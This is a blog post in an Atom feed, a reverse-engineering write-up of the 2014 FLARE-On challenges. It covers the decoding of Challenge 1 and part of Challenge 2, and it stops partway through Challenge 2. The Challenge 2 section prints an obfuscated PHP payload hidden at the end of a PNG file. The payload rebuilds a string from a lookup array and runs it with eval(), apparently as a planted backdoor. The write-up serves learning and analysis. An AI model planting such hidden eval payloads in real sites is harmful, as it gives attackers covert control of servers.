<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: FlareOn | Parsiya's Den]]></title>
  <link href="http://parsiya.net/blog/categories/flareon/atom.xml" rel="self"/>
  <link href="http://parsiya.net/"/>
  <updated>2015-01-05T08:13:31-05:00</updated>
  <id>http://parsiya.net/</id>
  <author>
    <name><![CDATA[Parsiya]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[My Adventure With Fireeye FLARE Challenge]]></title>
    <link href="http://parsiya.net/blog/2014-10-07-my-adventure-with-fireeye-flare-challenge/"/>
    <updated>2014-10-07T02:31:44-04:00</updated>
    <id>http://parsiya.net/blog/my-adventure-with-fireeye-flare-challenge</id>
    <content type="html"><![CDATA[<p>These are my (rather long) solutions to Fireeye’s FLARE challenge. This is just not the solution but other ways that I tried. This was a great learning experience for me so I am writing this post to document everything I tried. As a result, this post is somewhat long.</p>

<p>If you have any feedback, please let me know. I spent a lot of time on this writeup and I am always happy to learn new stuff. My email and twitter handle are in the sidebar.</p>

<p>I am a bit late to the party. There <del>were two</del> are now other three solutions posted (that I know of). Check them out.</p>

<ul>
  <li><a href="https://www.codeandsec.com/Detailed-Solutions-to-FireEye-FLARE-Challenge">Detailed Solutions to FireEye FLARE Challenge</a></li>
  <li><a href="http://www.ghettoforensics.com/2014/09/a-walkthrough-for-flare-re-challenges.html">A Walk through for FLARE RE Challenges</a></li>
  <li>The FLARE On Challenge Solutions by Fireye
    <ul>
      <li><a href="http://www.fireeye.com/blog/technical/cyber-exploits/2014/11/the-flare-on-challenge-solutions-part-1-of-2.html">Part 1 - solutions for challenges 1 to 5</a></li>
      <li><a href="https://www.fireeye.com/blog/threat-research/2014/11/flare_on_challengep.html">Part 2 - solutions for challenges 6 and 7</a></li>
    </ul>
  </li>
</ul>

<!-- more -->

<h3 id="links-to-individual-challenges">Links to Individual Challenges</h3>
<p>This post is quite long (I didn’t want to strip them into different posts), use the following links to jump to any specific challenge:</p>

<ul>
  <li><a href="#ch1">Challenge 1</a></li>
  <li><a href="#ch2">Challenge 2</a></li>
  <li><a href="#ch3">Challenge 3</a></li>
  <li><a href="#ch4">Challenge 4</a></li>
  <li><a href="#ch5">Challenge 5</a></li>
  <li><a href="#ch6">Challenge 6</a></li>
  <li><a href="#ch7">Challenge 7</a></li>
</ul>

<h3 id="my-setup">My Setup</h3>
<p>I used a Windows XP SP3 Virtual Machine for most challenges using VirtualBox. For challenge 6 I used a Kali 64-bit VM. I used IDA/Immunity on my host OS with some other utilities.</p>

<h3 id="helpful-tools">Helpful Tools</h3>
<ul>
  <li><a href="http://www.7-zip.org/download.html">7-zip</a></li>
  <li><a href="http://www.winitor.com/">PE-Studio</a>: Gain information about the binary <strong>without running it.</strong> It also sends a hash (MD5 I think) of the file to Virustotal so if you want to keep your samples secret, don’t give it internet access</li>
  <li><a href="http://www.jetbrains.com/decompiler/">dotPeek</a>: Free .NET decompiler by JetBrains</li>
  <li><a href="http://www.red-gate.com/products/dotnet-development/reflector/">.NET Reflector</a>: .NET decompiler. Not free but comes with a 2-week trial period</li>
  <li><a href="http://mh-nexus.de/en/downloads.php?product=HxD">HxD</a>: Free Windows hex editor</li>
  <li><a href="http://notepad-plus-plus.org/">Notepad++</a>: Slick FOSS text-editor</li>
  <li><a href="http://debugger.immunityinc.com/ID_register.py">Immunity Debugger</a>: Windows debugger. Very similar to <a href="http://www.ollydbg.de/">OllyDbg</a></li>
  <li><a href="https://code.google.com/p/pyew/">pyew</a>: A Python tool for static malware analysis. I used it for PDF analysis</li>
  <li><a href="https://www.hex-rays.com/products/ida/">IDA</a>: What can I say? It’s great but also costs an arm and a leg. Except challenge 6, the trial and free version are enough for us</li>
  <li><a href="http://home.gna.org/bless/">Bless</a>: Linux Hex editor</li>
  <li><a href="http://www.rohitab.com/apimonitor">API Monitor</a>: Free utility to monitor API calls in Windows. It can monitor calls for standard windows APIs or we can add application-specific Dlls and monitor them</li>
  <li><a href="https://www.wireshark.org/download.html">Wireshark</a>: FOSS network monitoring/capturing tool. Needs administrator access on Windows to install libpcap</li>
  <li><a href="http://www.microsoft.com/en-us/download/details.aspx?id=4865">Microsoft Network Monitor</a>: Microsoft network monitoring/capturing tool. Does not need administrator access. Replaced by <a href="http://www.microsoft.com/en-us/download/details.aspx?id=40308">Microsoft Message Analyzer</a></li>
</ul>

<hr />

<h2 id="a-namech1a-challenge-1---bob-roge"><a name="ch1"></a> Challenge 1 - Bob Roge</h2>
<p>The challenge starts with going to their website at <a href="http://flare-on.com">http://flare-on.com</a> and downloading a binary. The binary is a self-extracting zip file which is supposed to show you the challenge EULA. It didn’t work on my VM.</p>

<p><img src="/images/2014/flare/1-1.jpg" alt="Self-Extracting zip failed :(" title="Self-Extracting zip failed :(" /></p>

<p>I opened it with <code>7-zip</code> to get <code>Challenge1.exe</code>. By dropping it into <code>PE-Studio</code> I gained more information:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>PE-Studio info </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>The Image is a fake Microsoft executable    # Company name is Microsoft but it is not signed?
</span><span class='line'>The Manifest Identity name (MyApplication.app) is different than the Image name
</span><span class='line'>The Version Information ‘OriginalFilename’ (rev_challenge_1.exe) is different than the Image name
</span><span class='line'>The Debug Symbol File Name () is different than the Image name (challenge1)
</span><span class='line'>The image is Managed (.NET)</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>So it appears to be a .Net binary. Let’s run it.</p>

<p><img src="/images/2014/flare/1-2.jpg" alt="Challenge 1 executed" title="Challenge 1 executed" /></p>

<p>Hey I love this guy. Let’s press <code>DECODE.</code></p>

<p><img src="/images/2014/flare/1-3.jpg" alt="Much decode" title="Much decode" /></p>

<p>Look at that garbled data. We can decompile it (remember it’s a .Net binary). Using <code>dotPeek</code> we can see the code for <code>Decode</code> button:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>btnDecode_click </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='c#'><span class='line'><span class="k">private</span> <span class="k">void</span> <span class="nf">btnDecode_Click</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">,</span> <span class="n">EventArgs</span> <span class="n">e</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">this</span><span class="p">.</span><span class="n">pbRoge</span><span class="p">.</span><span class="n">Image</span> <span class="p">=</span> <span class="p">(</span><span class="n">Image</span><span class="p">)</span> <span class="n">Resources</span><span class="p">.</span><span class="n">bob_roge</span><span class="p">;</span> <span class="c1">// change the image</span>
</span><span class='line'>  <span class="kt">byte</span><span class="p">[]</span> <span class="n">datSecret</span> <span class="p">=</span> <span class="n">Resources</span><span class="p">.</span><span class="n">dat_secret</span><span class="p">;</span>        <span class="c1">// interesting</span>
</span><span class='line'>  <span class="kt">string</span> <span class="n">str1</span> <span class="p">=</span> <span class="err">“”</span><span class="p">;</span>
</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">index</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">index</span> <span class="p">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="n">datSecret</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="p">++</span><span class="n">index</span><span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>	<span class="kt">byte</span> <span class="n">num</span> <span class="p">=</span> <span class="n">datSecret</span><span class="p">[</span><span class="n">index</span><span class="p">];</span>
</span><span class='line'>	<span class="n">str1</span> <span class="p">=</span> <span class="n">str1</span> <span class="p">+</span> <span class="p">(</span><span class="kt">object</span><span class="p">)</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="p">(((</span><span class="kt">int</span><span class="p">)</span> <span class="n">num</span> <span class="err">»</span> <span class="m">4</span> <span class="p">|</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="n">num</span> <span class="err">«</span> <span class="m">4</span> <span class="p">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="m">240</span><span class="p">)</span> <span class="p">^</span> <span class="m">41</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="kt">string</span> <span class="n">str2</span> <span class="p">=</span> <span class="n">str1</span> <span class="p">+</span> <span class="err">“\</span><span class="m">0</span><span class="err">”</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">string</span> <span class="n">str3</span> <span class="p">=</span> <span class="err">“”</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">index1</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
</span><span class='line'>  <span class="k">while</span> <span class="p">(</span><span class="n">index1</span> <span class="p">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="n">str2</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>	<span class="n">str3</span> <span class="p">=</span> <span class="n">str3</span> <span class="p">+</span> <span class="p">(</span><span class="kt">object</span><span class="p">)</span> <span class="n">str2</span><span class="p">[</span><span class="n">index1</span> <span class="p">+</span> <span class="m">1</span><span class="p">]</span> <span class="p">+</span> <span class="p">(</span><span class="kt">object</span><span class="p">)</span> <span class="n">str2</span><span class="p">[</span><span class="n">index1</span><span class="p">];</span>
</span><span class='line'>	<span class="n">index1</span> <span class="p">+=</span> <span class="m">2</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="kt">string</span> <span class="n">str4</span> <span class="p">=</span> <span class="err">“”</span><span class="p">;</span>
</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">index2</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">index2</span> <span class="p">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="n">str3</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="p">++</span><span class="n">index2</span><span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>	<span class="kt">int</span> <span class="n">num</span> <span class="p">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="n">str3</span><span class="p">[</span><span class="n">index2</span><span class="p">];</span>
</span><span class='line'>	<span class="n">str4</span> <span class="p">=</span> <span class="n">str4</span> <span class="p">+</span> <span class="p">(</span><span class="kt">object</span><span class="p">)</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="p">((</span><span class="kt">uint</span><span class="p">)</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)</span> <span class="n">str3</span><span class="p">[</span><span class="n">index2</span><span class="p">]</span> <span class="p">^</span> <span class="m">102</span><span class="n">U</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">this</span><span class="p">.</span><span class="n">lbl_title</span><span class="p">.</span><span class="n">Text</span> <span class="p">=</span> <span class="n">str4</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Line 4 reads <code>dat_secret</code> and the rest of the function manipulates it before displaying it on the form. To save this file expand <code>resources</code> and select <code>rev_challenge_1.dat_secret.encode</code>. Right click and select <code>Save Resource to File.</code></p>

<p><img src="/images/2014/flare/1-4.jpg/" alt="Saving private secret" title="Saving private secret" /> </p>

<p>I used <code>HxD</code> to look at the contents.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Contents of dat_secret </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>A1 B5 44 84 14 E4 A1 B5 D4 70 B4 91 B4 70 D4 91 E4 C4 96 F4 54 84 B5 C4 40 64 74 70 A4 64 44
</span><span class='line'>¡µD„.ä¡µÔp´‘´pÔ‘äÄ–ôT„µÄ@dtp¤dD</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Let’s run the code with <code>dat_secret</code> and print the result after each level (i.e. <code>str2, str3 and str4</code>). One option is to use the provided C# code. I re-wrote the code in Python and ran it online using <a href="http://repl.it/languages">repl.it</a>. Str1 is the answer so we don’t care about the rest:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Decoding dat_secret </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">datsecret</span> <span class="o">=</span> <span class="n">unhexlify</span> <span class="p">(</span><span class="err">“</span><span class="n">A1B5448414E4A1B5D470B491B470D491E4C496F45484B5C440647470A46444</span><span class="err">”</span><span class="p">)</span>
</span><span class='line'><span class="n">str1</span><span class="o">=</span><span class="err">””</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">datsecret</span><span class="p">:</span>
</span><span class='line'>    <span class="n">num</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">item</span><span class="p">)</span>
</span><span class='line'>    <span class="n">str1</span> <span class="o">+=</span>  <span class="nb">chr</span><span class="p">(</span> <span class="p">(</span> <span class="n">num</span><span class="err"> »</span> <span class="mi">4</span> <span class="o">|</span> <span class="n">num</span> <span class="err">« </span><span class="mi">4</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="mi">240</span><span class="p">)</span> <span class="o">^</span> <span class="mi">41</span> <span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="n">str1</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Flag 1 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>3rmahg3rd.b0b.d0ge@flare-on.com</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<hr />

<h2 id="a-namech2a-challenge-2---a-study-in-javascript"><a name="ch2"></a> Challenge 2 - A Study in JavaScript</h2>
<p>```
Well done! Looks like you kicked that one. I’ve attached the next challenge for your reversing pleasure. The password to this zip archive is “malware”.
We saw what looked like attacker activity to this site, can you figure out what the attackers changed?
Hopefully you’ll knock this one out too, Good luck!</p>

<p>-FLARE
```
Inside the archive seems to be a copy of the original <a href="http://flare-on.com">http://flare-on.com</a> with a launch date countdown timer. I will be calling the html page from the website <code>original_html</code> and the one in the zip file <code>challenge_html</code>.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Contents of challenge zip file </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='powershell'><span class='line'><span class="n">-rwx</span><span class="err">——</span><span class="p">+</span> <span class="n">1</span> <span class="n">TyRaX</span> <span class="n">None</span> <span class="n">8378</span> <span class="n">home</span><span class="p">.</span><span class="n">html</span><span class="p">&lt;/</span><span class="n">p</span><span class="p">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="p">&lt;</span><span class="n">p</span><span class="p">&gt;</span><span class="n">directory</span> <span class="n">called</span> <span class="err">“</span><span class="n">img</span><span class="err">”</span> <span class="n">with</span> <span class="n">one</span> <span class="n">single</span> <span class="n">png</span>
</span><span class='line'><span class="n">-rwx</span><span class="err">——</span><span class="p">+</span> <span class="n">1</span> <span class="n">TyRaX</span> <span class="n">None</span> <span class="n">9560</span> <span class="n">flare-on</span><span class="p">.</span><span class="n">png</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p><img src="/images/2014/flare/2-1.jpg" alt="challenge_html" title="challenge_html" /></p>

<p>The original web page looks a bit different.
<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Original web page </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='powershell'><span class='line'><span class="n">-rwx</span><span class="err">——</span><span class="p">+</span> <span class="n">1</span> <span class="n">TyRaX</span> <span class="n">None</span> <span class="n">6254</span> <span class="n">The</span> <span class="n">FLARE</span> <span class="n">On</span> <span class="n">Challenge</span><span class="p">.</span><span class="n">htm</span><span class="p">&lt;/</span><span class="n">p</span><span class="p">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="p">&lt;</span><span class="n">p</span><span class="p">&gt;</span><span class="n">and</span>
</span><span class='line'><span class="n">-rwx</span><span class="err">——</span><span class="p">+</span> <span class="n">1</span> <span class="n">TyRaX</span> <span class="n">None</span> <span class="n">116290</span> <span class="n">bootstrap</span><span class="p">.</span><span class="n">css</span>
</span><span class='line'><span class="n">-rwx</span><span class="err">——</span><span class="p">+</span> <span class="n">1</span> <span class="n">TyRaX</span> <span class="n">None</span>   <span class="n">6596</span> <span class="n">flare-on-V2</span><span class="p">.</span><span class="n">png</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p><img src="/images/2014/flare/2-2.jpg" alt="original_html" title="original_html" /></p>

<p>The timer threw me off track. Is it really a countdown timer? When does it reach zero?<br />
I changed the time in my VM to mess with it but it synced up with host.  </p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>To de-sync guest and host time/date </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='powershell'><span class='line'><span class="c"># vboxmanage is in the VirtualBox installation directory</span>
</span><span class='line'><span class="c"># So on Windows: C:\Program Files\Oracle\VirtualBox</span>
</span><span class='line'><span class="n">vboxmanage</span> <span class="n">setextradata</span> <span class="no">[VMname]</span> <span class="err">“</span><span class="n">VBoxInternal</span><span class="p">/</span><span class="n">Devices</span><span class="p">/</span><span class="n">VMMDev</span><span class="p">/</span><span class="n">0</span><span class="p">/</span><span class="n">Config</span><span class="p">/</span><span class="n">GetHostTimeDisabled</span><span class="err">”</span> <span class="err">“</span><span class="n">1</span><span class="err">”</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Changing the time did not mess with anything.</p>

<p>We can diff the htmls or use Notepad++’s <a href="http://www.davidtan.org/how-to-compare-two-text-files-using-notepad-plus/">compare</a> plugin.
Most differences are aesthetic. There are two interesting differences. In line 54, <code>original_html</code> has <code>&lt;img src="The%20FLARE%20On%20Challenge_files/flare-on-V2.png"&gt;</code> while <code>challenge_html</code> includes <code>&lt;img src="img/flare-on.png"&gt;</code>. So the file in the website is version 2 of the image. Later in the <code>challenge_html</code> we see more evidence of this image file <code>&lt;?php include "img/flare-on-V3.png" ?&gt;</code>. But wiat a minute, the filesize of these images were different:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Different sizes </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='powershell'><span class='line'><span class="n">-rwx</span><span class="err">——</span><span class="p">+</span> <span class="n">1</span> <span class="n">TyRaX</span> <span class="n">None</span> <span class="n">9560</span> <span class="n">Jul</span>  <span class="n">7</span> <span class="n">21</span><span class="err">:</span><span class="n">30</span> <span class="n">flare-on</span><span class="p">.</span><span class="n">png</span>
</span><span class='line'><span class="n">-rwx</span><span class="err">——</span><span class="p">+</span> <span class="n">1</span> <span class="n">TyRaX</span> <span class="n">None</span> <span class="n">6596</span> <span class="n">Dec</span> <span class="n">18</span>  <span class="n">2013</span> <span class="n">flare-on-V2</span><span class="p">.</span><span class="n">png</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>The challenge png is bigger. I used <code>HxD</code> to compare these two files (as they are not text) and at the end of <code>flare-on.png</code> I saw some PHP code. To be honest I was thinking of steganography or some <a href="https://twitter.com/angealbertini">Ange Albertini magic</a>. But that would have been too hard for level 2. Here is the PHP code (beautified):</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Code inside png </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'><span class="nv">$terms</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="err">“</span><span class="nx">M</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="nx">Z</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="p">]</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="nx">p</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="nx">\</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="nx">w</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="nx">f</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="mi">1</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="nx">v</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="nx">a</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="nx">Q</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="nx">z</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span> <span class="err">“</span><span class="p">,</span> <span class="err">“</span><span class="nx">s</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="nx">m</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="o">+</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="nx">E</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="nx">D</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="nx">g</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="nx">W</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="s2">&quot;”, “q”, “y”, “T”, “V”, “n”, “S”, “X”, “)”, “9”, “C”, “P”, “r”, “&amp;amp;”, “&#39;”, “!”, “x”, “G”, “:”, “2”, “~”, “O”, “h”, “u”, “U”, “@”, “;”, “H”, “3”, “F”, “6”, “b”, “L”, “&amp;gt;”, “^”, “,”, “.”, “l”, “$”, “d”, “`”, “%”, “N”, “*”, “[”, “0”, “}”, “J”, “-“, “5”, “_”, “A”, “=”, “{“, “k”, “o”, “7”, “#”, “i”, “I”, “Y”, “(“, “j”, “/”, “?”, “K”, “c”, “B”, “t”, “R”, “4”, “8”, “e”, “|”);</span>
</span><span class='line'><span class="si">$order</span><span class="s2">=array(59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, 11, 76, 68, 50, 30, 11, 24, 7, 63, 45, 20, 23, 68, 87, 42, 24, 60, 87, 63, 18, 58, 87, 63, 18, 58, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 17, 37, 63, 58, 37, 91, 63, 83, 43, 87, 42, 24, 60, 87, 93, 18, 87, 66, 28, 48, 19, 66, 63, 50, 37, 91, 63, 17, 1, 87, 93, 18, 45, 66, 28, 48, 19, 40, 11, 25, 5, 70, 63, 7, 37, 91, 63, 12, 1, 87, 93, 18, 81, 37, 28, 48, 19, 12, 63, 25, 37, 91, 63, 83, 63, 87, 93, 18, 87, 23, 28, 18, 75, 49, 28, 48, 19, 49, 0, 50, 37, 91, 63, 18, 50, 87, 42, 18, 90, 87, 93, 18, 81, 40, 28, 48, 19, 40, 11, 7, 5, 70, 63, 7, 37, 91, 63, 12, 68, 87, 93, 18, 81, 7, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 18, 17, 37, 0, 50, 5, 40, 42, 50, 5, 49, 42, 25, 5, 91, 63, 50, 5, 70, 42, 25, 37, 91, 63, 75, 1, 87, 93, 18, 1, 17, 80, 58, 66, 3, 86, 27, 88, 77, 80, 38, 25, 40, 81, 20, 5, 76, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 7, 88, 32, 45, 7, 90, 52, 80, 58, 5, 70, 63, 7, 5, 66, 42, 25, 37, 91, 0, 12, 50, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 48, 19, 7, 63, 50, 5, 37, 0, 24, 1, 87, 0, 24, 72, 66, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 1, 87, 93, 18, 11, 66, 28, 18, 87, 70, 28, 48, 19, 7, 63, 50, 5, 37, 0, 18, 1, 87, 42, 24, 60, 87, 0, 24, 17, 91, 28, 18, 75, 49, 28, 18, 45, 12, 28, 48, 19, 40, 0, 7, 5, 37, 0, 24, 90, 87, 93, 18, 81, 37, 28, 48, 19, 49, 0, 50, 5, 40, 63, 25, 5, 91, 63, 50, 5, 37, 0, 18, 68, 87, 93, 18, 1, 18, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 90, 87, 0, 24, 72, 37, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 48, 19, 40, 90, 25, 37, 91, 63, 18, 90, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 75, 70, 28, 48, 19, 40, 90, 58, 37, 91, 63, 75, 11, 79, 28, 27, 75, 3, 42, 23, 88, 30, 35, 47, 59, 71, 71, 73, 35, 68, 38, 63, 8, 1, 38, 45, 30, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 23, 75, 77, 1, 28, 1, 43, 52, 31, 19, 75, 81, 40, 30, 75, 1, 27, 75, 77, 35, 47, 59, 71, 71, 71, 73, 21, 4, 37, 51, 40, 4, 7, 91, 7, 4, 37, 77, 49, 4, 7, 91, 70, 4, 37, 49, 51, 4, 51, 91, 4, 37, 70, 6, 4, 7, 91, 91, 4, 37, 51, 70, 4, 7, 91, 49, 4, 37, 51, 6, 4, 7, 91, 91, 4, 37, 51, 70, 21, 47, 93, 8, 10, 58, 82, 59, 71, 71, 71, 82, 59, 71, 71, 29, 29, 47);&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="s2">&lt;p&gt;</span><span class="si">$do_me</span><span class="s2">=””;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="s2">&lt;p&gt;for (</span><span class="si">$i</span><span class="s2">=0;</span><span class="si">$i</span><span class="s2">&amp;lt;count(</span><span class="si">$order</span><span class="s2">);</span><span class="si">$i</span><span class="s2">++) </span>
</span><span class='line'><span class="s2">{</span>
</span><span class='line'><span class="s2">	</span><span class="si">$do_me</span><span class="s2">=</span><span class="si">$do_me</span><span class="s2">.</span><span class="si">$terms[$order[$i]]</span><span class="s2">;</span>
</span><span class='line'><span class="s2">}&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="s2">&lt;p&gt;eval(</span><span class="si">$do_me</span><span class="s2">); </span>
</span><span class='line'><span class="s2">?&amp;gt;</span>
